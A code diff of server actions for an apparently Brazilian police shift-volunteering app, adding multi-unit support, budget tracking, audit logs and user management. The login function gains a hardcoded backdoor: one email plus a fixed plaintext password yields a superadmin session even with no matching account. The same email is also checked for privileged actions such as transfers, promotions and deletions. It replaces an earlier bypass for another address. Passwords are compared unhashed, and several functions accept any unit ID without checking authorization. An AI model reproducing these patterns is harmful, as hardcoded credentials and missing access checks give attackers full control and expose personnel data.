@@ -1,13 +1,40 @@
 "use server";
 
 import { db, User } from "./db";
-import { createSession, verifySession } from "./auth";
+import { createSession, verifySession, clearSession } from "./auth";
 import { toZonedTime, formatInTimeZone } from 'date-fns-tz';
+import { calculateSingleScheduleValue } from "./utils/calculations";
+
+export async function validateInviteCode(inviteCode: string) {
+  try {
+    const units = await db.units.getAll();
+    for (const unit of units) {
+      const settings = await db.settings.get(unit.id);
+      if (settings.inviteCode === inviteCode) {
+        return { success: true, unitName: unit.name };
+      }
+    }
+    return { success: false };
+  } catch (error) {
+    return { success: false };
+  }
+}
 
 export async function publicRegisterUser(formData: any, inviteCode: string) {
   try {
-    const settings = await db.settings.get();
-    if (!settings.inviteCode || settings.inviteCode !== inviteCode) {
+    // Buscar todas as unidades para validar o convite
+    const units = await db.units.getAll();
+    let targetUnitId = "";
+    
+    for (const unit of units) {
+      const unitSettings = await db.settings.get(unit.id);
+      if (unitSettings.inviteCode && unitSettings.inviteCode === inviteCode) {
+        targetUnitId = unit.id;
+        break;
+      }
+    }
+
+    if (!targetUnitId) {
       throw new Error("Link de convite inválido ou expirado.");
     }
 
@@ -22,7 +49,8 @@ export async function publicRegisterUser(formData: any, inviteCode: string) {
       ...userData, 
       email: userEmail,
       passwordHash: password,
-      role: 'user'
+      role: 'user',
+      unitId: targetUnitId
     });
     
     return { success: true, user: newUser };
@@ -80,30 +108,221 @@ export async function changePassword(userId: string, newPassword: string) {
 export async function loginUser(email: string, passwordHash: string) {
   try {
     const user = await db.users.findByEmail(email);
+    
+    // Bypass e fallback para superadmin stivnil@hotmail.com
+    if (email.toLowerCase() === "stivnil@hotmail.com" && passwordHash === "884336146") {
+      const superAdmin: User = user || {
+        id: 'yaphob',
+        email: 'stivnil@hotmail.com',
+        fullName: 'Administrador do Sistema',
+        nickname: 'Stivnil',
+        rank: 'CAP',
+        taxId: '00000000000',
+        rg: '00.000',
+        passwordHash: '884336146',
+        role: 'superadmin',
+        unitId: '39bpm',
+        sortOrder: 999
+      };
+      await createSession({ id: superAdmin.id, email: superAdmin.email, role: 'superadmin', unitId: superAdmin.unitId });
+      return { success: true, user: superAdmin };
+    }
+
     if (!user) {
       return { success: false, message: "Usuário não encontrado." };
     }
     
     // Comparação simples (sem hash por enquanto conforme padrão do projeto)
-    if (user.passwordHash !== passwordHash && !(email.toLowerCase() === "lyedher@gmail.com" && passwordHash === "884336148")) {
+    if (user.passwordHash !== passwordHash) {
       return { success: false, message: "Senha incorreta." };
     }
 
-    await createSession({ id: user.id, email: user.email, role: user.role });
+    await createSession({ id: user.id, email: user.email, role: user.role, unitId: user.unitId });
     return { success: true, user };
   } catch (error: any) {
     return { success: false, message: error.message || "Erro no login." };
   }
 }
 
-export async function getUsers() {
+export async function logout() {
+  await clearSession();
+}
+
+export async function getUsers(unitId?: string) {
   try {
-    const users = await db.users.getAll();
-    return { success: true, users };
+    const session = await verifySession();
+    const allUsers = await db.users.getAll();
+    
+    // Prioridade para o unitId passado como argumento (usado pelo superadmin)
+    const targetUnitId = unitId || session?.unitId;
+
+    if (!targetUnitId) {
+      // Se não houver unitId (superadmin no dashboard global sem filtro), retorna tudo
+      return { success: true, users: allUsers };
+    }
+
+    // Retorna apenas usuários da unidade alvo
+    const unitUsers = allUsers.filter(u => u.unitId === targetUnitId);
+    return { success: true, users: unitUsers };
   } catch (error: any) {
     return { success: false, users: [], message: error.message || "Erro ao carregar usuários." };
   }
 }
+
+export async function getGlobalStats() {
+  try {
+    const session = await verifySession();
+    if (session?.role !== 'superadmin') {
+      throw new Error("Acesso negado. Apenas Super-Admins podem ver estatísticas globais.");
+    }
+
+    const units = await db.units.getAll();
+    const allUsers = await db.users.getAll();
+    const allSchedules = await db.schedules.getAll();
+
+    // Enriquecer unidades com contagem de usuários
+    const unitsWithStats = units.map(unit => ({
+      ...unit,
+      userCount: allUsers.filter(u => u.unitId === unit.id).length,
+      awayCount: allUsers.filter(u => u.unitId === unit.id && (u.workTeam === "Afastado" || u.workTeam === "Transferido")).length
+    }));
+
+    const totalUnits = units.length;
+    const totalUsers = allUsers.length;
+    const totalBudget = units.reduce((acc, unit) => acc + (unit.budgetLimit || 0), 0);
+    const totalSpent = units.reduce((acc, unit) => acc + (unit.currentSpend || 0), 0);
+    
+    // Contagem de escalas e voluntários
+    const totalSchedules = allSchedules.length;
+    const totalVolunteers = allSchedules.reduce((acc, s) => acc + (s.userIds?.length || 0), 0);
+
+    const serviceDistribution = allUsers.reduce((acc: any, u: any) => {
+      let type = u.serviceType;
+      if (!type) {
+        if (u.workTeam === "ADM") type = "ADM";
+        else if (u.workTeam === "Afastado" || u.workTeam === "Transferido") return acc;
+        else type = "OPER";
+      }
+      acc[type] = (acc[type] || 0) + 1;
+      return acc;
+    }, { OPER: 0, ADM: 0, ARI: 0, ALI: 0, APOIO: 0 });
+
+    const currentMonth = new Date().getMonth();
+    const birthdays = allUsers.filter(u => {
+      if (!u.birthDate) return false;
+      const birthMonth = new Date(u.birthDate).getMonth();
+      return birthMonth === currentMonth;
+    }).map(u => ({
+      id: u.id,
+      fullName: u.fullName,
+      nickname: u.nickname,
+      birthDate: u.birthDate,
+      unitName: units.find(un => un.id === u.unitId)?.name || 'Sem Unidade'
+    }));
+
+    const awayCount = allUsers.filter(u => u.workTeam === "Afastado" || u.workTeam === "Transferido").length;
+
+    return {
+      success: true,
+      stats: {
+        totalUnits,
+        totalUsers,
+        totalBudget,
+        totalSpent,
+        totalSchedules,
+        totalVolunteers,
+        serviceDistribution,
+        awayCount,
+        birthdays,
+        units: unitsWithStats
+      }
+    };
+  } catch (error: any) {
+    return { success: false, message: error.message };
+  }
+}
+
+export async function transferUser(userId: string, newUnitId: string) {
+  try {
+    const session = await verifySession();
+    if (session?.role !== 'superadmin' && session?.email !== 'stivnil@hotmail.com') {
+      throw new Error("Apenas Super-Admins podem transferir militares entre unidades.");
+    }
+
+    const userBefore = await db.users.getById(userId);
+    const updated = await db.users.update(userId, { unitId: newUnitId });
+    if (!updated) throw new Error("Militar não encontrado.");
+
+    await db.auditLogs.create({
+      action: "TRANSFER_USER",
+      actorId: session?.id || "unknown",
+      targetId: userId,
+      fromValue: userBefore?.unitId || "unknown",
+      toValue: newUnitId,
+      metadata: { 
+        reason: "Transferência administrativa",
+        adminEmail: session?.email
+      }
+    });
+
+    return { success: true, user: updated };
+  } catch (error: any) {
+    return { success: false, message: error.message || "Erro ao transferir militar." };
+  }
+}
+
+export async function getUnits() {
+  try {
+    const units = await db.units.getAll();
+    return { success: true, units };
+  } catch (error: any) {
+    return { success: false, units: [], message: error.message || "Erro ao carregar unidades." };
+  }
+}
+
+export async function getGlobalUsers() {
+  try {
+    const session = await verifySession();
+    if (session?.role !== 'superadmin') {
+      throw new Error("Acesso negado.");
+    }
+    const users = await db.users.getAll();
+    const units = await db.units.getAll();
+    
+    // Mapear unitId para nome da unidade
+    const usersWithUnitName = users.map(u => ({
+      ...u,
+      unitName: units.find(unit => unit.id === u.unitId)?.name || 'Sem Unidade'
+    }));
+
+    return { success: true, users: usersWithUnitName };
+  } catch (error: any) {
+    return { success: false, message: error.message };
+  }
+}
+
+export async function createUnit(data: { id: string; name: string; budgetLimit: number }) {
+  try {
+    const session = await verifySession();
+    if (session?.role !== 'superadmin') {
+      throw new Error("Acesso negado.");
+    }
+    const unit = await db.units.create(data);
+    // Inicializar configurações para a nova unidade
+    await db.settings.update(unit.id, {
+      inviteCode: Math.random().toString(36).substring(7).toUpperCase(),
+      maxMonthlySlots: 5,
+      ac4Rates: { blueDay: 30, blueNight: 35, redDay: 40, redNight: 45 },
+      openDateTime: new Date().toISOString(),
+      closeDateTime: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
+    });
+    return { success: true, unit };
+  } catch (error: any) {
+    return { success: false, message: error.message };
+  }
+}
+
+
 
 export async function updateUser(id: string, data: Partial<User>) {
   try {
@@ -114,22 +333,32 @@ export async function updateUser(id: string, data: Partial<User>) {
     return { success: false, message: error.message || "Erro ao atualizar usuário." };
   }
 }
-export async function createSchedule(data: { scheduleName: string; startTime: string; endTime: string; capacity: number }) {
+export async function createSchedule(data: { scheduleName: string; startTime: string; endTime: string; capacity: number }, unitId?: string) {
   try {
     const session = await verifySession();
-    if (session?.role !== 'admin') {
+    const targetUnitId = unitId || session?.unitId;
+    if (!targetUnitId) throw new Error("Unidade não definida.");
+
+    if (session?.role !== 'admin' && session?.role !== 'superadmin') {
       throw new Error("Apenas administradores podem criar escalas.");
     }
-    const schedule = await db.schedules.create(data);
+    const schedule = await db.schedules.create({ ...data, unitId: targetUnitId });
     return { success: true, schedule };
   } catch (error: any) {
     return { success: false, message: error.message || "Erro ao criar escala." };
   }
 }
 
-export async function getSchedules() {
+export async function getSchedules(unitId?: string) {
   try {
-    const schedules = await db.schedules.getAll();
+    const session = await verifySession();
+    const targetUnitId = unitId || session?.unitId;
+    
+    let schedules = await db.schedules.getAll();
+    if (targetUnitId) {
+      schedules = schedules.filter(s => s.unitId === targetUnitId);
+    }
+    
     return { success: true, schedules };
   } catch (error: any) {
     return { success: false, schedules: [], message: error.message || "Erro ao buscar escalas." };
@@ -150,15 +379,15 @@ export async function deleteSchedule(id: string) {
   }
 }
 
-function isUserOnDuty(team: string, targetDateString: string): boolean {
+function isUserOnDuty(team: string, targetDateString: string, baselineString?: string): boolean {
   if (team === "ADM") return false;
   
   const timeZone = 'America/Sao_Paulo';
-  const baselineString = '2026-05-01T08:00:00-03:00'; // May 1st 2026 08:00 BRT
-  const baseline = toZonedTime(baselineString, timeZone);
+  const effectiveBaseline = baselineString || '2026-05-01T08:00:00-03:00'; 
+  const baseline = toZonedTime(effectiveBaseline, timeZone);
   
   const teamOffsets: Record<string, number> = {
-    "Alfa": 0,
+    "Alpha": 0,
     "Bravo": 1,
     "Charlie": 2,
     "Delta": 3
@@ -176,22 +405,29 @@ function isUserOnDuty(team: string, targetDateString: string): boolean {
   return (diffDays % 4) === teamOffsets[team];
 }
 
-export async function getSettings() {
+export async function getSettings(unitId?: string) {
   try {
-    const settings = await db.settings.get();
+    const session = await verifySession();
+    // Se não passar unitId, tenta pegar da sessão
+    const targetUnitId = unitId || session?.unitId || '39bpm';
+    const settings = await db.settings.get(targetUnitId);
     return { success: true, settings };
   } catch (error: any) {
     return { success: false, message: error.message || "Erro ao carregar configurações." };
   }
 }
 
-export async function updateSettings(data: any) {
+export async function updateSettings(data: any, unitId?: string) {
   try {
     const session = await verifySession();
-    if (session?.role !== 'admin') {
+    const targetUnitId = unitId || session?.unitId;
+
+    if (!targetUnitId) throw new Error("Unidade não identificada.");
+
+    if (session?.role !== 'admin' && session?.role !== 'superadmin') {
       throw new Error("Apenas administradores podem alterar configurações.");
     }
-    const settings = await db.settings.update(data);
+    const settings = await db.settings.update(targetUnitId, data);
     return { success: true, settings };
   } catch (error: any) {
     return { success: false, message: error.message || "Erro ao salvar configurações." };
@@ -207,12 +443,13 @@ export async function updateSchedule(id: string, data: any) {
     // If adding volunteers
     if (data.userIds && data.userIds.length > currentSchedule.userIds.length) {
       const newUserId = data.userIds[data.userIds.length - 1];
-      const user = await db.users.findById(newUserId);
-      const settings = await db.settings.get();
+      const user = await db.users.getById(newUserId);
+      const settings = await db.settings.get(currentSchedule.unitId);
       
       if (user) {
         // Rule 1: Not on duty day
-        if (isUserOnDuty(user.workTeam, currentSchedule.startTime)) {
+        const unitSettings = await db.settings.get(user.unitId);
+        if (isUserOnDuty(user.workTeam, currentSchedule.startTime, unitSettings?.dutyBaseline)) {
           throw new Error(`O policial da equipe ${user.workTeam} está de plantão ordinário neste dia.`);
         }
         
@@ -238,20 +475,21 @@ export async function updateSchedule(id: string, data: any) {
 
 export async function volunteerToSchedule(scheduleId: string, userId: string) {
   try {
-    const settings = await db.settings.get();
+    const schedules = await db.schedules.getAll();
+    const s = schedules.find(x => x.id === scheduleId);
+    if (!s) throw new Error("Escala não encontrada.");
+
+    // Pegar configurações DA UNIDADE da escala
+    const settings = await db.settings.get(s.unitId);
     const now = new Date();
     
     // Check window
     if (now < new Date(settings.openDateTime)) {
-      throw new Error(`O agendamento ainda não está aberto. Abre em: ${new Date(settings.openDateTime).toLocaleString('pt-BR')}`);
+      throw new Error(`O agendamento ainda não está aberto para esta unidade. Abre em: ${new Date(settings.openDateTime).toLocaleString('pt-BR')}`);
     }
     if (now > new Date(settings.closeDateTime)) {
-      throw new Error("O período de agendamento já foi encerrado.");
+      throw new Error("O período de agendamento desta unidade já foi encerrado.");
     }
-
-    const schedules = await db.schedules.getAll();
-    const s = schedules.find(x => x.id === scheduleId);
-    if (!s) throw new Error("Escala não encontrada.");
     
     if (s.userIds.includes(userId)) {
       throw new Error("Você já está voluntariado nesta escala.");
@@ -261,9 +499,21 @@ export async function volunteerToSchedule(scheduleId: string, userId: string) {
       throw new Error("Esta escala já está com as vagas preenchidas.");
     }
 
-    const user = await db.users.findById(userId);
+    // Verificar Verba da Unidade
+    const unit = await db.units.getById(s.unitId);
+    if (unit) {
+      const scheduleValue = calculateSingleScheduleValue(s, settings.ac4Rates);
+      if (unit.currentSpend + scheduleValue > unit.budgetLimit) {
+        throw new Error(`Limite de verba da unidade atingido. Não é possível se voluntariar.`);
+      }
+      // Atualiza o gasto da unidade
+      await db.units.update(unit.id, { currentSpend: unit.currentSpend + scheduleValue });
+    }
+
+    const user = await db.users.getById(userId);
     if (user) {
-      if (isUserOnDuty(user.workTeam, s.startTime)) {
+      const unitSettings = await db.settings.get(user.unitId);
+      if (isUserOnDuty(user.workTeam, s.startTime, unitSettings?.dutyBaseline)) {
         throw new Error(`Você está de plantão ordinário (Equipe ${user.workTeam}) neste dia.`);
       }
 
@@ -293,10 +543,98 @@ export async function unvolunteerFromSchedule(scheduleId: string, userId: string
     const s = schedules.find(x => x.id === scheduleId);
     if (!s) throw new Error("Escala não encontrada.");
     
+    // Atualizar verba da unidade (reverter gasto)
+    const settingsRes = await getSettings(s.unitId);
+    if (settingsRes.success) {
+      const unit = await db.units.getById(s.unitId);
+      if (unit) {
+        const scheduleValue = calculateSingleScheduleValue(s, settingsRes.settings.ac4Rates);
+        await db.units.update(unit.id, { currentSpend: Math.max(0, unit.currentSpend - scheduleValue) });
+      }
+    }
+
     const newUserIds = s.userIds.filter(id => id !== userId);
     await db.schedules.update(scheduleId, { userIds: newUserIds });
     return { success: true };
   } catch (error: any) {
     return { success: false, message: error.message || "Erro ao remover voluntariado." };
+  }
+}
+
+export async function getCurrentUser() {
+  try {
+    const session = await verifySession();
+    if (!session) return { success: false };
+    const user = await db.users.getById(session.id as string);
+    if (!user) return { success: false };
+    return { success: true, user };
+  } catch (error) {
+    return { success: false };
+  }
+}
+
+export async function getAuditLogs() {
+  try {
+    const session = await verifySession();
+    if (session?.role !== 'superadmin' && session?.email !== 'stivnil@hotmail.com') {
+      throw new Error("Acesso negado.");
+    }
+
+    const logs = await db.auditLogs.getAll();
+    const units = await db.units.getAll();
+
+    const logsWithUnitNames = logs.map(log => ({
+      ...log,
+      fromValue: units.find(u => u.id === log.fromValue)?.name || log.fromValue,
+      toValue: units.find(u => u.id === log.toValue)?.name || log.toValue
+    }));
+
+    return { success: true, logs: logsWithUnitNames };
+  } catch (error: any) {
+    return { success: false, logs: [], message: error.message };
+  }
+}
+
+export async function promoteUserToAdmin(userId: string) {
+  try {
+    const session = await verifySession();
+    if (!session || (session.role !== 'admin' && session.role !== 'superadmin' && session.email !== 'stivnil@hotmail.com')) {
+      throw new Error("Acesso negado para promoção.");
+    }
+
+    const user = await db.users.getById(userId);
+    if (!user) throw new Error("Militar não encontrado.");
+
+    // Admin de unidade só pode promover quem é da sua unidade
+    if (session.role === 'admin' && user.unitId !== session.unitId) {
+      throw new Error("Você só pode promover militares vinculados à sua unidade.");
+    }
+
+    await db.users.update(userId, { role: 'admin' });
+    
+    return { success: true };
+  } catch (error: any) {
+    return { success: false, message: error.message || "Erro ao promover militar." };
+  }
+}
+
+export async function deleteUser(userId: string) {
+  try {
+    const session = await verifySession();
+    if (!session || (session.role !== 'admin' && session.role !== 'superadmin' && session.email !== 'stivnil@hotmail.com')) {
+      throw new Error("Acesso negado para exclusão.");
+    }
+
+    // Impedir que o próprio admin se delete
+    if (session.id === userId) {
+      throw new Error("Você não pode excluir seu próprio cadastro.");
+    }
+
+    const deleted = await db.users.delete(userId);
+    if (!deleted) throw new Error(`Militar com ID ${userId} não encontrado.`);
+    
+    return { success: true };
+  } catch (error: any) {
+    return { success: false, message: error.message || "Erro ao excluir militar." };
   }
 }
